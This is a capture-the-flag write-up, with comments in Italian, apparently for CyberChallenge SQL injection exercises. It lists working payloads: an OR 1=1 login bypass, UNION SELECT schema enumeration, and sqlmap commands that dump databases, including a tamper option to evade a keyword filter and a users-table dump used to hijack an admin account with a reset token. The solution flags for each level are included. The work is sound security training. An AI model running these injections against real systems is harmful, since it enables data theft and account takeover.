# SQL Injection lvl 1
```mysql
poop' OR 1=1-- '  // CCIT{1s_ths_h0w_l0g1ns_w0rk}
```


# SQL Injection lvl 2`
```mysql
1' UNION SELECT 1, 2, 3, 4, 5, table_name FROM INFORMATION_SCHEMA.tables -- '     -- Tabella 'real_data'.
1' UNION SELECT 1, 2, 3, 4, 5, column_name FROM INFORMATION_SCHEMA.columns -- '   -- Colonna 'FLAG'.
1' UNION SELECT 1, 2, 3, 4, 5, FLAG FROM real_data -- '`                          -- CCIT{Uni0ns_4re_so_tr1vi4l}.
```


# SQL Injection lvl 3
```bash
sqlmap -r inj_lvl_3.txt --dbs                                    -- Trovo il database bliddb.
sqlmap -r inj_lvl_3.txt -D blinddb --tables                      -- Trovo la tabella 'secret'.
sqlmap -r inj_lvl_3.txt -D blinddb -T secret --columns           -- Trovo la colonna 'asecret'.
sqlmap -r inj_lvl_3.txt -D blinddb -T secret -C asecret --dump   -- CCIT{A_bl1ndy_fl4g}.
```


# SQL Injection lvl 4
```bash
sqlmap -r inj_lvl_4.txt --dbs                               -- Trovo il database timedb.
sqlmap -r inj_lvl_4.txt -D timedb --tables                  -- Trovo la tabella 'flags'.
sqlmap -r inj_lvl_4.txt -D timedb -T flags --columns        -- Trovo la colonna 'flag'.
sqlmap -r inj_lvl_4.txt -D timedb -T flags -C flag --dump   -- CCIT{Dont_trus7_tim3}.
```

# Filtered
```bash
sqlmap -u http://149.202.200.158:5111/post.php?id=* --dbs                                                          -- Trovo il db 'filtered'.
sqlmap -u http://149.202.200.158:5111/post.php?id=* -D --tables                                                    -- Trovo la tabella 'flaggy'.
sqlmap -u http://149.202.200.158:5111/post.php?id=#1 --tamper=symboliclogical --hex -D filtered -T flaggy --dump   -- CCIT{Bl4ckl1sts_Ar3_s0_c00l}
```
Se si usa un altro tamper la funzione is_hackerz lo blocca, dato che non ammette le keyword 'UNION' e 'AND', cosi bypassiamo questa cosa usando '&&' anziche 'AND'.


# Yet Another Blog
```bash
sqlmap -u http://yetanotherblog.challs.cyberchallenge.it/post.php?id=* --dbs                                -- Trovo il database 'yet_another_blog'.
sqlmap -u http://yetanotherblog.challs.cyberchallenge.it/post.php?id=* -D yet_another_blog --tables         -- Trovo la tabella 'users'.
sqlmap -u http://yetanotherblog.challs.cyberchallenge.it/post.php?id=* -D yet_another_blog -T users --dump
```
Prendo il 'reset token' e cambio la password di 'admin', effetto il login e ricevo la falg. -> CCIT{Hash_y0ur_r3s3t_t0ken_t00}.
